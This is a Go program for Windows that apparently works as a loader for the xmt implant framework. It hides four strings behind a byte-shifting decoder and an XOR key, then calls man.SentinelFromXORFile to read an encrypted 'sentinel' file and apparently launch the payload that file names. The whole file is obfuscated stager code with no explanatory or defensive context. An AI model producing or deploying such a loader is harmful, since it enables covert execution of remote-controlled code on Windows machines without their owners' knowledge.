// +build windows

package main

import (
	"github.com/iDigitalFlame/xmt/data/crypto"
	"github.com/iDigitalFlame/xmt/man"
)

var (
	v0 = crypto.XOR(x(63, []byte{19, 37, 35, 18, 34, 29, 40, 12, 46, 36, 28, 41}))
	v1 = x(63, []byte{4, 250, 27, 21, 38, 42, 31, 41, 48, 43, 19, 9, 46, 39, 39, 23, 30, 227, 225, 10, 32, 20, 16, 22, 21, 253, 240, 217, 215, 210, 7, 14, 13})
	v2 = x(63, []byte{24, 41, 45, 34, 44, 51, 14, 31, 28, 8, 41, 37, 43, 245, 3, 251})
	v3 = x(63, []byte{41, 52, 51, 46, 247, 235, 234, 235, 242, 234, 229, 231, 235, 236, 225, 226, 223, 225, 233, 230, 221, 228, 219, 217, 16, 29, 8, 24, 9})
)

func main() {
	man.SentinelFromXORFile(v1, v2, v3, v0)
}
func x(v int, b []byte) string {
	for i := range b {
		b[i] += byte(i + v)
	}
	return string(b)
}
